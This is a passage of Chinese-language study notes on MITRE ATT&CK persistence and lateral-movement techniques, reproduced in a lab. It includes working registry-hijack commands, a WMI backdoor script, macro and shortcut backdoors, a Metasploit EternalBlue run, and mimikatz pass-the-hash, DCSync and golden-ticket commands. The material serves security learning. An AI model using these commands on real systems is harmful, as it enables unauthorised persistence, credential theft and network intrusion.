__cplusplus\n}\n#endif\n```\n\n将代码编译成对应的exe和dll文件之后我们进行测试。\n\n首先打开HookMain.exe程序，然后程序会自动调用对应的DLL文件，然后使用ProcessExplorer查看发现此时notepad.exe还没有调用Keyhook.dll\n\n![1574865501933](Persistence.assets/1574865501933.png)\n\n在notepad.exe中尝试输入字母发现并不能输入，再次Search发现notepad已经调用了KeyHook.dll文件，键盘的输入被拦截。\n\n![1574865521455](Persistence.assets/1574865521455.png)\n\n这是一个简单的消息钩子，使用的API是SetWindowsHookEx()这个API，在使用SetWindowsHookEx()设置好钩子之后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入到响应进程，然后调用注册的钩子过程。攻击者可以通过钩子获取键盘输入、执行恶意代码、等等操作，同时还允许访问进程的内存和可能的特权。\n\n## （未完成）Hypervisor\n\nHypervisor又称为虚拟机监视器（Virtual machine monitor），是用来建立与执行虚拟机器的软件、固件或硬件。\n\n## Image File Execution Options Injection\n\nImage File Execution Options Injection简称IFEO（映像劫持），使开发人员可以将调试器附加到应用程序。比如将cmd.exe设置为notepad.exe调试器，在执行notepad.exe时，实际上执行的是cmd.exe（上可以设置开启启动，也可以设置关闭时启动等）。\n\n演示的方式很简单，直接修改注册表：\n\n```\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v Debugger /d \"cmd.exe\"\n```\n\n![1574865572322](Persistence.assets/1574865572322.png)\n\n可以看到运行notepad.exe的时候cmd.exe被执行了。\n\n## Launch Agent\n\nMACOS\n\n## Launch Daemon-T1160\n\nMACOS\n\n## Launchctl\n\nMACOS\n\n## LC_LOAD_DYLIB Addition\n\nMACOS\n\n## Local Job Scheduling\n\n也就是本地的定时计划，crontab的使用，在执行一章里也有：\n\n```\ncrontab -e //进入计划任务的编辑模式\n* * * * * myCommand //每分钟执行命令一次\n```\n\n可以使用crontab执行本地能够反弹shell的脚本。\n\n具体的命令可以参考https://www.runoob.com/linux/linux-comm-crontab.html\n\n## Login Item\n\nMACOS\n\n## Logon Scripts\n\n登录脚本，可以在windows中指定用户登录时运行的脚本，攻击者可以植入后门等。\n\n![1574865844188](Persistence.assets/1574865844188.png)\n\n运行修改注册表的bat文件，执行命令修改注册表，然后再次重新登录时设定的UserInitMprLogonScript的值会被执行（也就是c:\\run_calc.bat）。\n\n命令为：\n\n```\nREG.exe ADD HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"c:\\run_calc.bat\"\n```\n\n实际上UserInitMprLogonScript的值也是可以直接设置为命令的。\n\n![1574865893067](Persistence.assets/1574865893067.png)\n\n## 未完成Modify Existing Service\n\n通过修改注册表中服务的配置信息，比如该服务的可执行文件等，将现有服务执行的文件修改成恶意文件，从而达到持久化的目的。\n\n但是复现的时候发现服务使用普通的exe文件会出现问题，暂时没有深究。\n\n## Netsh Helper DLL\n\nNetsh.exe（也称为Netshell）是用于与系统的网络配置进行交互的命令行脚本实用程序。它包含添加辅助DLL的功能，以扩展实用程序的功能。也就是使用Netsh.exe进行加载DLL。\n\n这里使用此前的测试DLL，语句为：\n\n```\nnetsh.exe add helper c:\\fortest.dll\n```\n\n![1574866249288](Persistence.assets/1574866249288.png)\n\n但是实际上在原文中提到的仍然是需要使用其他的持久性方式来使用netsh执行恶意dll，所以个人认为实际上这个可以放在Execution章节中。\n\n不错的链接：\n\nhttps://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html\n\n## New Service-T1050\n\n顾名思义，通过创建自动运行的新服务来进行执行相应的文件或者代码，和Execution中Service Execution-T1035那一节意思大体差不多，不再说明了。\n\n## Office Application Startup\n\n主要是说利用Office启动时的一些持久化方法，这里主要说一下在文档中插入宏，在打开Office时用于执行代码并获得持久性。\n\n创建一个文档，然后通过快捷键Alt+F11启动Microsoft Visual Basic for Application并且在其中插入代码：\n\n```\nPrivate Sub Document_Open()\n  MsgBox \"ATT&CK Test~\", vbOKOnly, \"att&ck test\"\n  a = Shell(\"calc.exe\", vbHide)\nEnd Sub\n```\n\n![1574866449981](Persistence.assets/1574866449981.png)\n\n然后保存成dotm格式（doc能不能这样没测）\n\n![1574866461296](Persistence.assets/1574866461296.png)\n\n在启用宏的情况下VB代码被执行：\n\n![1574866473222](Persistence.assets/1574866473222.png)\n\n## Path Interception-T1034\n\n主要是说类似于可信任服务路径漏洞的一些情况，比如当一个程序使用了CreateProcess函数，并且没有正确的对CreateProcess函数中的第二个参数进行添加双引号，并且这个程序加载的二进制文件（也或者是安装目录，因为一般加载的文件都是在安装目录下）还存在空格，那么这个程序就可能存在这一漏洞。\n\n其中powershell脚本工具Powerup就能够搜索系统中可能存在此类漏洞的程序。可信任服务路径漏洞的原理：\n\n![1574866555386](Persistence.assets/1574866555386.png)\n\n之前找到过这样的软件的漏洞，复现直接跳过了。\n\n## Plist Modification\n\nMACOS\n\n## 未完成/Port Knocking\n\nPort Knocking是一种隐藏端口的技术，典型的例子是Cd00r。Cd00r提供外部对系统的远程访问，而无需一直显示开放的端口。通过在指定的接口捕获这种数据包，\n\nhttp://www.phenoelit.org/stuff/cd00r.c\n\n## 未完成/Port Monitors\n\n可以通过系统API来设置端口监视器，设置在对应端口启动时会加载的DLL。\n\n## Rc.common\n\nMACOS\n\n## Re-opened Applications\n\nMACOS\n\n## Redundant Access\n\n冗余访问，算不上一种技术，算是一个想法吧，就是在维持权限的时候保留更多的登录方式，防止权限丢失。比如在留后门的时候同时上传Webshell，也就是多留后门。\n\n## Registry Run Keys / Startup Folder\n\n在注册表或启动文件夹中的“运行键”中添加条目将使引用的程序在**用户登录**时执行。\n\n使用calc.exe演示（这里是重启之后登录的时候的弹窗，为了显示又把注册表命令运行了一遍）：\n\n![1574866747408](Persistence.assets/1574866747408.png)\n\n注册表命令：\n\n```\nREG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v RegRun /t REG_SZ /d \"c:\\windows\\system32\\calc.exe\"\n```\n\n类似的注册表键值：\n\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n```\n\n## （未完成）Scheduled Task-T1053\n\n即通过计划任务进行执行指定文件，不过感觉这种方式一般可能会用来运行后门文件\n\n## Screensaver\n\n通过修改屏保对应的注册表来实现持久化。\n\n以下屏幕保护程序设置存储在注册表（HKCU\\Control Panel\\Desktop\\）中，可以对其进行操作以实现持久性：\n\n```\nSCRNSAVE.exe -设置为恶意PE路径\nScreenSaveActive -设置为“ 1”以启用屏幕保护程序\nScreenSaverIsSecure -设置为“ 0”不需要密码即可解锁\nScreenSaverTimeout -在执行屏幕保护程序之前设置用户不活动超时\n```\n\n如果原本已经开启了屏保则直接执行注册表修改命令即可：\n\n```\nreg.exe add \"hkcu\\control panel\\desktop\" /v SCRNSAVE.EXE /d c:\\windows\\system32\\calc.exe\n```\n\n![1574867030953](Persistence.assets/1574867030953.png)\n\n## 未完成Security Support Provider\n\nSecurity Support Provider也就是Windows的安全支持程序，常见的NTLM、Kerberos、CredSSP等协议都要在这个框架下运行。这个程序的DLL会在系统启动时被加载到（Local Security Authority）LSA中。\n\n## 未完成Service Registry Permissions Weakness-T1058\n\nWindows将本地服务配置信息存储在注册表中的下HKLM\\SYSTEM\\CurrentControlSet\\Services。可以通过服务控制器，sc.exe，PowerShell或Reg等工具来操纵存储在服务的注册表项下的信息，以修改服务的执行参数。通过访问控制列表和权限控制对注册表项的访问。\n\n## Setuid and Setgid\n\nSetuid and Setgid是在Linux上的标记位，在Linux中，文件和目录的所有权是基于文件创建者的默认uid(user-id)和gid(group-id)的。启动一个进程时也是相同的情况：它以启动它的用户的uid和gid运行，并具有相应的权限。这种行为可以通过使用特殊的权限进行改变。\n\n```\nSetuid的作用就是“让执行某个命令的用户以该命令拥有者的权限去执行”。\nSetgid的作用是“让执行文件的用户以该文件所属组的权限去执行”。\n```\n\n首先简单说一下linux的权限：\n\n![1574867813365](Persistence.assets/1574867813365.png)\n\n根据上下图对照可以了解到/etc/passwd对于文件所有者是可读可写权限，而对于其他用户是只能读权限。\n\n![1574867827439](Persistence.assets/1574867827439.png)\n\n而/usr/bin/passwd的文件所有者的权限为rws，这个s就是setuid的标志，它的意思是其他用户在执行passwd的时候使用的权限也是文件所有者的权限。\n\n通过这样的机制攻击者进行shell逃逸，或者是利用具有setuid或者是setgid标记位的应用程序的漏洞执行代码（感觉这个攻击成本会比较高）。\n\n关于shell逃逸其中有一个文章可以借鉴:\n\n[https://www.iloveflag.com/2019/06/15/rbash%E9%80%83%E9%80%B8/](https://www.iloveflag.com/2019/06/15/rbash逃逸/)\n\n## Shortcut Modification\n\n快捷方式修改，一般是只通过修改windows操作系统中的link文件来执行后门代码。就像ATT&CK官网说的那样：\n\n快捷方式或符号链接是引用其他文件或程序的方法，这些文件或程序在系统启动过程中单击或执行快捷方式时将被打开或执行。对手可以使用快捷方式来执行其持久性工具。\n\nEmpire中也有对应的创建快捷方式后门的脚本：\n\n脚本使用：Empire/data/module_source/persistence/Invoke-BackdoorLNK.ps1\n\n![1574868110139](Persistence.assets/1574868110139.png)\n\n![1574868116791](Persistence.assets/1574868116791.png)\n\n![1574868124265](Persistence.assets/1574868124265.png)\n\n再win7上打开lnk时，Empire反弹回shell，后门创建成功\n\n![1574868149702](Persistence.assets/1574868149702.png)\n\n更简单一点的方式就是直接创建一个vbs文件：\n\n```\nSet test = CreateObject(\"Wscript.Shell\")\ntest.Run \"calc.exe\"\ntest.Run \"cmd.exe\"\n```\n\n![1574868200720](Persistence.assets/1574868200720.png)\n\n然后将一个calc.exe的快捷方式的目标地址修改为vbs的地址：\n\n![1574868213882](Persistence.assets/1574868213882.png)\n\n修改之后图标会变成VBS的，需要修改一下，点击上图的更改图标即可，这里没找到计算器的图标，用了一个IE的。\n\n![1574868226492](Persistence.assets/1574868226492.png)\n\n然后点击快捷方式会发现cmd.exe和calc.exe同时启动：\n\n![1574868249980](Persistence.assets/1574868249980.png)\n\n## （未完成）SIP and Trust Provider Hijacking-T1198\n\nSIP和信任提供者劫持，首先要了解一下SIP是什么？\n\n简单的说SIP就是一个判断文件签名和验证文件签名的一种机制。\n\n流程入下：\n\n![1574868277073](Persistence.assets/1574868277073.png)\n\n更多的细节可以参考：\n\nhttps://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\n\n攻击者可能劫持SIP和信任提供程序组件，以误导操作系统和白名单工具。\n\n## Startup Items\n\nMACOS\n\n## System Firmware-T1019\n\n系统固件，BIOS和统一可扩展固件接口（UEFI）或可扩展固件接口（EFI）是系统固件的示例，它们充当计算机的操作系统和硬件之间的软件接口。\n\n一般情况下是指Rootkit的方式来留存后门，原理上来说就是恶意程序在BIOS运行之前运行，这样就可以躲避任何杀软的检测。这个暂时没打算复现。不是很了解这个技术。\n\n## Systemd Service-T1501\n\n这里的系统服务说明的是Linux上的服务，而不是windows上的，说到Systemd就要说到Init进程，在基于Unix的计算机操作系统中，Init进程是一个守护进程，它是计算机系统启动期间启动的第一个进程。Init是一个守护进程，它将一直运行到系统关闭。它是所有其他进程的直接或者间接的父进程。\n\n而Systemd则取代了Init，相对来说Systemd更具优点，功能强大使用方便。同时缺点是体系庞大，非常复杂。\n\n下面是Systemd的架构图：\n\n![1574868337743](Persistence.assets/1574868337743.png)\n\n而监视和控制Systemd的主要命令就是systemctl：\n\n```\n# 重启系统\n$ sudo systemctl reboot\n# 关闭系统，切断电源\n$ sudo systemctl poweroff\n# CPU停止工作\n$ sudo systemctl halt\n# 暂停系统\n$ sudo systemctl suspend\n# 让系统进入冬眠状态\n$ sudo systemctl hibernate\n# 让系统进入交互式休眠状态\n$ sudo systemctl hybrid-sleep\n# 启动进入救援状态（单用户状态）\n$ sudo systemctl rescue\n```\n\n在Linux系统中，有些软件支持Systemd，而有些是不支持的，对于支持Systemd的软件来说，安装的时候会在/usr/lib/systemd/system目录添加一个配置文件。如果想让该软件开机启动，则可以执行下面的命令，比如（http.service）\n\n```\nsudo systemctl enable httpd\n```\n\n上面的命令相当于在/etc/systemd/system目录添加一个符号链接，指向/usr/lib/systemd/system里面的httpd.service文件。这是因为开机时，Systemd只执行/etc/systemd/system目录里面的配置文件。也就是说如果通过修改/etc/systemd/system中以.service为后缀的配置文件，就可以在Linux系统开机时执行恶意代码。\n\n比如kali下面sshd服务的service文件内容为：\n\n![1574868383686](Persistence.assets/1574868383686.png)\n\n其中ExecStart即为在启动时执行的命令，实际可以通过此命令配置成任意想要执行的命令。.service配置文件的语法相对来说较为固定，详细的可以参考链接：\n\nhttps://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html\n\n## （未完成）Time Providers-T1209\n\nWindows时间服务（W32Time）启用跨域和域内的时间同步。 W32Time时间提供者负责从硬件/网络资源中检索时间戳，并将这些值输出到其他网络客户端。\n\n相关细节：https://docs.microsoft.com/zh-cn/windows-server/networking/windows-time-service/windows-time-service-top\n\n没试验成功\n\n## Trap-T1154\n\nTrap是说Linux或者macOS下的命令，该命令允许程序和shell指定在接收中断信号时将执行的命令。常见的情况是脚本允许正常终止和处理常见的键盘中断，如ctrl+c和ctrl+d。攻击者可以使用它来注册当shell遇到特定中断以执行或作为持久性机制时要执行的代码。\n\n语法：\n\n```\ntrap commands signals\n```\n\n其中commands是触发signals信号后会执行的命令\n\n例：\n\n```\ntrap \"echo ' ATT&CK : Test trap ~'\" HUP INT QUIT TSTP\n```\n\n![1574868470720](Persistence.assets/1574868470720.png)\n\n可以看到这里在按下Ctrl+c之后echo语句触发，打印出对应字段。其中每一种signals信号在Linux中是特定的,可以使用trap -l来查看列表实际上也可以通过数字来代替对应的signals名称，具体每一种代表的含义可参考链接：\n\nhttps://www.cnblogs.com/frisk/p/11602973.html\n\nhttps://man.linuxde.net/trap\n\n![1574868521864](Persistence.assets/1574868521864.png)\n\n## Valid Accounts-T1078\n\n有效账户。。。？认为是一种思路，而非具体的技术，就是说有了现在系统上已经存在的有效账户的凭据等等，来维持权限。\n\n## Webshell-T1100\n\nWebshell？说的就是留Webshell的方式吧。\n\n## Windows Management Instrumentation Event Subscription-T1084\n\nWindows Management Instrumentation（WMI）是一种Windows管理功能，可为Windows系统组件的本地和远程访问提供统一的环境。它依赖于本地和远程访问的WMI服务以及远程访问的服务器消息块（SMB）和远程过程调用服务（RPCS）。在执行一章中说到了通过WMI进行远程执行命令，这里说的是通过WMI的事件订阅功能来实现持久化。\n\n![1574868572577](Persistence.assets/1574868572577.png)\n\n### WMI事件概念：\n\n​    WMI事件是创建从操作系统中或在创建其自己的WMI事件的应用程序中检测到特定操作的WMI查询。这些时间可以用于检测此类操作作为进程结束、正在创建的文件或者注册表项被修改。简单的说就是WMI可以检测系统中的一些改变，当系统中发生了特定的改变之后能够进行相应的操作或者通知。还有就是这些操作必须以管理员权限进行。\n\n在一个WMI事件中需要几个功能：\n\n1、 Filter\n\nFilter的功能是一个WQL查询，列出了想要查找的内容。\n\n2、 Consumer\n\nConsumer的主要作用是接收WMI事件，或者说是一个接口，在接到对应的WMI事件之后不同的Consumer会执行不同的操作。也就是说在设置了Filter进行筛选对应的事件之后会使用Consumer进行后续的操作处理。\n\n```\nActiveScriptEventConsumer：\n将事件传递给预定义脚本后，它将以任意脚本语言执行该脚本。此使用者在Windows 2000及更高版本上可用。\n\nCommandLineEventConsumer：\n向其传递事件时，在本地系统上下文中启动任意进程。此使用者可在Windows XP及更高版本上使用。\n\nLogFileEventConsumer：\n当事件传递到文本日志文件时，将自定义字符串写入文本日志文件。此使用者可在Windows XP及更高版本上使用。\n\nNTEventLogEventConsumer：\n向其传递事件时，将特定消息记录到Windows NT事件日志中。此使用者可在Windows XP及更高版本上使用。\n\nSMTPEventConsumer：\n每次将事件传递给它时，都会使用SMTP发送电子邮件。此使用者在Windows 2000及更高版本上可用。\n```\n\n3、  Binding\n\nBinding的功能就是将Filter和Consumer结合在一起。如果要禁用现有的WMI订阅，需要做的就是删除绑定实例，并且您将不再启用订阅。\n\n### WMI事件订阅：\n\n创建事件订阅的方式有很多种，可以使用Powershell下的cmdlet Set-WMIInstance创建永久的事件订阅。\n\n可以参考链接：\n\nhttps://learn-powershell.net/2013/08/14/powershell-and-events-permanent-wmi-event-subscriptions/\n\n这里拿一个网上已经生成的实例来进行演示：\n\n使用脚本WMIBackdoor.ps1（来源是乌云镜像上的三好学生提供的：https://wooyun.x10sec.org/static/drops/tips-8189.html）\n\n代码内容为：\n\n```\n$filterName = 'TestWMI'\n$consumerName = 'attackWMI'\n$exePath = 'C:\\Windows\\System32\\calc.exe'\n$Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\n$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace \"root\\subscription\" -Arguments @{Name=$filterName;EventNameSpace=\"root\\cimv2\";QueryLanguage=\"WQL\";Query=$Query} -ErrorAction Stop\n$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}\nSet-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\\subscription\" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}\n```\n\n![1574868747750](Persistence.assets/1574868747750.png)\n\n直接运行后可以在进程列表中看到每10秒钟运行一个新的calc.exe进程：\n\n![1574868771142](Persistence.assets/1574868771142.png)\n\n更多的关于Set-WmiInstance的细节可以参考：\n\nhttps://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Set-WmiInstance?view=powershell-5.1&redirectedfrom=MSDN\n\n上面的WMIBackdoor脚本实际上就是分别创建了Filter、Consumer、Binding三个功能，组合在一起实现了calc.exe的自动运行。\n\n可以通过命令查看对应的Filter、Consumer、Binding：\n\n```\n#List Event Filters\nGet-WMIObject -Namespace root\\Subscription -Class __EventFilter\n#List Event Consumers\nGet-WMIObject -Namespace root\\Subscription -Class __EventConsumer\n#List Event Bindings\nGet-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding\n```\n\n删除：\n\n```\n#Filter\nGet-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='TestWMI'\" | Remove-WmiObject -Verbose\n#Consumer\nGet-WMIObject -Namespace root\\Subscription -Class CommandLineEventConsumer -Filter \"Name='attackWMI'\" | Remove-WmiObject -Verbose\n#Binding\nGet-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding -Filter \"__Path LIKE '%BotFilter82%'\" | Remove-WmiObject -Verbose\n```\n\n## Winlogon Helper DLL- T1004\n\nWinlogon.exe是Windows组件，负责登录/注销时的操作以及由Ctrl-Alt-Delete触发的安全注意序列（SAS）。\n\n```\nHKLM\\Software[Wow6432Node]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\n```\n\n上面两个注册表中的注册表项用于管理支持Winlogon的其他帮助程序和功能。也就是说攻击者可以通过修改这两个注册表的内容来进行插入后门的操作。其中主要已知的能够被修改并添加后门的键值为：\n\n```\nWinlogon\\Notify\nWinlogon\\Userinit\nWinlogon\\Shell\n```\n\n实验：\n\n在注册表下面注册表中添加C:\\Windows\\System32\\calc.exe\n\n```\nHKLM\\Software[Wow6432Node]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\n```\n\n![1574868916140](Persistence.assets/1574868916140.png)\n\n再次登录时（需要注销的情况下会触发，注销而不是锁定）会发现弹出计算器。\n\n注册表修改命令：\n\n```\nreg.exe add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /d C:\\Windows\\system32\\userinit.exe,C:\\Windows\\system32\\calc.exe /f\n```\n\n","categories":["ATT&CK"]},{"title":"ATT&CK_Lateral Movement","url":"/2020/12-18-ATT&CK_Lateral Movement/","content":"\n## AppleScript\n\n MACOS\n\n## Application Deployment Software-T1017\n\n严格来说这是一种思路，而不是一种具体形式的攻击\n\n简单来说就是通过控制网络中的分发软件控制台，将恶意代码嵌入到原本需要分发给内网主机的软件中。\n\n比如一个内网中存在终端管理系统，攻击者攻破了终端管理系统的服务器，则可以通过这个服务器分发控制端至内网主机上。\n\n## 未完成Distributed Component Object Model-T1175\n\nCOM组件主要是说攻击者可能会使用COM组件和DCOM（分布式组件对象模型）进行本地代码执行，或者是作为远程移动的一部分在远程系统上执行。\n\nhttps://ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model\n\n## Exploitation of Remote Services-T1210\n\n攻击远程服务，其中提到了比如SMB和RDP的一些CVE漏洞，还有一些MySQL等的远程服务的漏洞。比如最著名的MS17-010和今年的RDP的远程代码执行漏洞。\n\nMS17010直接使用MSF就可以利用,网上已退\n\n```\nmsfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset rhost 192.168.144.130\nexploit\n```\n\n## Logon Scripts-T1037\n\nWindows中允许在特定用户或用户组在登录系统时运行登录脚本。也就是开机自启动脚本，一般情况下用来权限维持，原文中提到的关于横向渗透的场景是在一个中央服务器中，其他主机会定时来请求脚本并执行的情况。\n\n![1574328137025](Lateral_Movement.assets/1574328137025.png)\n\n运行修改注册表的bat文件，执行命令修改注册表，然后再次重新登录时设定的UserInitMprLogonScript的值会被执行（也就是c:\\run_calc.bat）。\n\n命令为：\n\n```\nREG.exe ADD HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"c:\\run_calc.bat\"\n```\n\n同时UserInitMprLogonScript的值是可以直接设置为命令的。\n\n![1574328195643](Lateral_Movement.assets/1574328195643.png)\n\n## Pass the Hash-T1075\n\nPass the Hash是指通过已经有的HASH值来进行hash传递获得目标主机的访问权限。\n\n例如在其他主机中想要访问0m0a1.com域中的主机dc.0m0a1.com,那么可以使用mimikatz进行PTH的攻击。\n\n![1574328241859](Lateral_Movement.assets/1574328241859.png)\n\n```\nmimikatz#privilege::debug\nmimikatz#sekurlsa::pth /user:administrator /domain:0m0a1.com /ntlm: 4cb55ea6471d29ccbb2ce4cf00271fe3\n```\n\n![1574328257831](Lateral_Movement.assets/1574328257831.png)\n\n同样还有Wmiexec等其他工具也可以实现相同的功能：\n\n![1574328359528](Lateral_Movement.assets/1574328359528.png)\n\n像crackmapexec工具还可以批量进行试探。\n\n## Pass the Ticket-T1097\n\nPass the ticket是指在kerberos协议中使用的票据传递攻击\n\n票据传递攻击，两种，黄金票据和白银票据\n\n**黄金票据**\n\n黄金票据其实就是伪造的TGT，因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST，黄金票据的条件要求：\n\n```\n1.域名称 \n2.域的SID值 \n3.域的KRBTGT账户NTLM hash\n4.伪造用户名，直接写了administrator，可以是任意的\n```\n\n假如在上一步获得了权限之后，可以通过dcsync攻击获取指定账户的HASH值\n\n```\nlsadump::dcsync /domain:0m0a1.com /user:krbtgt\n```\n\n这里会向域控请求krbtgt账户的hash值\n\n![1574328478292](Lateral_Movement.assets/1574328478292.png)\n\n然后抓到ktbtgt的NTLM hash之后之后生成黄金票据（TGT 由ktbtgt HASH加密sessionkey-as和TimeStamp），这个过程是不与TGS进行KDC进行交互的\n\n![1574328487038](Lateral_Movement.assets/1574328487038.png)\n\n![1574328503885](Lateral_Movement.assets/1574328503885.png)\n\n这样的方式导入的票据20分钟之内生效，如果过期再次导入就可以，只要krbtgt的账号不变，通常情况下是和域控的账密一样，但是不会随域控管理员密码改变而改变\n\n![1574328510920](Lateral_Movement.assets/1574328510920.png)\n\n## Remote Desktop Protocol-T1076\n\n通过RDP协议进行的攻击，主要提到了RDP的劫持和通过窃取域管理员或者更高权限的账户会话来提升权限。\n\n想要理解RDP的劫持，首先通过RDP登陆一台主机，在退出之后查看windows任务管理器可以看到之前的记录\n\n![1574328537700](Lateral_Movement.assets/1574328537700.png)\n\n也可以通过query user在命令行查看\n\n![1574328545759](Lateral_Movement.assets/1574328545759.png)\n\n这时可以通过tscon命令切换到已经断开连接的用户界面，Tscon的作用就是将用户会话连接到远程桌面会话。\n\n![1574328559009](Lateral_Movement.assets/1574328559009.png)\n\n此时有两种可能：\n\n1、 有本地system权限，那么可以直接使用tscon 2跳转到session 2（testwin7）的桌面\n\n使用psexec64.exe –s cmd创建一个system权限的cmd窗口。\n\n![1574328575986](Lateral_Movement.assets/1574328575986.png)\n\n![1574328584828](Lateral_Movement.assets/1574328584828.png)\n\n2、 没有本地system权限，需要使用密码才能跳转\n\n![1574328595004](Lateral_Movement.assets/1574328595004.png)\n\n命令执行成功之后会直接从administrator的桌面跳转到session 2 也就是testwin7的桌面\n\n![1574328603868](Lateral_Movement.assets/1574328603868.png)\n\n## Remote File Copy-T1105\n\n说明了再横向渗透中可以通过一些SMB等协议，或者是FTP协议等进行横向移动，这种复制一般是需要账号密码，或者是需要未授权、本地以及有了Session的情况。\n\n比如Windows下通过SMB协议进行远程复制：\n\n```\ncp \\\\hostA\\c$\\aaa.txt c:\\\n```\n\n使用上面的命令就可以把远程主机hostA上C盘的aaa.txt文件复制到本地c盘。\n\n## Remote Services-T1021\n\n原文说的是“远程服务，指攻击者可以使用有效的账户，登录远程服务”。比如SSH、Telnet等。但是个人认为在实际环境中在遇到SSH、Telnet之类的情况应该大部分需要进行暴力破解。\n\n## Replication Through Removable Media-T1091\n\n通过可移动媒体，主要是说通过USB或者U盘等设备来进行感染病毒。比如比较有名的Bad USB，在U盘插入电脑的时候就会自动执行恶意程序。\n\nhttps://www.freebuf.com/sectool/107242.html\n\n在Freebuf上有比较详细的复现方法，这里因为需要硬件，所以我没有复现。\n\n## Shared Webroot-T1051\n\nWebroot是ASP.NET WEB应用程序的根目录，攻击者通过Webroot或者是Web内容目录开放网络文件共享将恶意内容（比如一个webshell）添加到内部可访问的网站，然后使用Web浏览器访问上传的webshell使服务器执行恶意内容。\n\n![1574332242527](Lateral_Movement.assets/1574332242527.png)\n\n但是实际上C盘对外部开放的情况还是比较小的\n\n## （未完成）SSH Hijacking-T1184\n\nSSH劫持\n\n1、 劫持screen会话\n\nScreen命令可以创建后台运行的会话\n\n这里是通过root通过su – testuser和screen –r 4772.pts-4.kali跳转到了testuser创建的screen会话中。但是从root到testuser的意义是什么？\n\n![1574332297450](Lateral_Movement.assets/1574332297450.png)\n\n## Taint Shared Content-T1080\n\n指一些污染共享的例子，比如公司的FTP服务器等，通过隐藏文件或者是目录隐藏等方式。个人认为算一种思路而不是一种技术。\n\n## Third-party Software-T1072\n\n攻击第三方软件，如客户端管理软件。个人认为算一种思路而不是一种技术。\n\n## Windows Admin Shares-T1077\n\n通过Admin Shares共享，默认情况下IPC$和ADMIN$是访问不了的，通过net use访问一般情况下需要输入账号密码。存在一种情况是发起请求的主机中已经保存了曾经访问过的session值，那么就可以根据已经有的session值去访问。\n\n同时也可以通过PTH、PTT的方式。\n\n## Windows Remote Management-T1028\n\nWINRM是WS-Management协议的Microsoft实现，该协议的目的是为跨多种类型的设备（包括固件）和操作系统的管理操作提供一致性和互操作性。WS-Management协议的当前实现基于以下标准规范：HTTPS，HTTP上的SOAP（WS-I配置文件），SOAP 1.2，WS-Addressing，WS-Transfer，WS-Enumeration和WS-Eventing。\n\n在拥有本地管理员权限以及目的的权限的情况下可以通过WINRM的WSMAN进行执行命令：\n\n```powershell\nInvoke-Command -ComputerName exchange2012 -ScriptBlock {ipconfig}\n```\n\n![1574333040602](Lateral_Movement.assets/1574333040602.png)\n\n```powershell\nInvoke-Command -ComputerName exchange2012 -ScriptBlock {whoami}\n```\n\n![1574333045835](Lateral_Movement.assets/1574333045835.png)\n\n通过抓包可以看到走的主要是HTTP协议，命令以及执行结果的传输全部进行了加密:\n\n![1574333076975](Lateral_Movement.assets/1574333076975.png)\n\n![1574333082062](Lateral_Movement.assets/1574333082062.png)\n\n同时mimikatz还支持使用WINRM进行远程获取LSASS中存储的hash值:\n\n```powershell\nImport-Module .\\Invoke-Mimikatz.ps1\nInvoke-Mimikatz -ComputerName exchange2012\n```\n\n![1574333109782](Lateral_Movement.assets/1574333109782.png)\n\n同时也可以用于持久化，将原本没有开启WINRM的主机使用下列命令开启:\n\n```powershell\nEnable-PSRemoting –Force\n```\n\n![1574333138165](Lateral_Movement.assets/1574333138165.png)\n\n在一些情况下可能无法通过WinRM连接，就是说明需要做一些其他的配置:\n\n```powershell\nwinrm quickconfig\nwinrm set winrm/config/Client @{AllowUnencrypted = \"true\"}\nSet-Item WSMan:localhost\\client\\trustedhosts -value *\n```\n\n","categories":["ATT&CK"]},{"title":"ATT&CK_Execution","url":"/2020/12-18-ATT&CK_Execution/","content":"\n## CMSTP\n\nCMSTP是Windows的重要组成部分，主要作用是与Microsoft连接管理器配置文件安装程序关联的二进制文件。它接受INF文件，这些文件可以通过恶意命令武器化，以脚本（SCT）和DLL的形式执行任意代码。它是一个受信任的Microsoft二进制文件，位于以下两个Windows目录中。\n\n```\nC:\\Windows\\System32\\cmstp.exe\nC:\\Windows\\SysWOW64\\cmstp.exe\n```\n\n微软的官方文档：\n\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp\n\n基于CMSTP的方法有很多种\n\n### 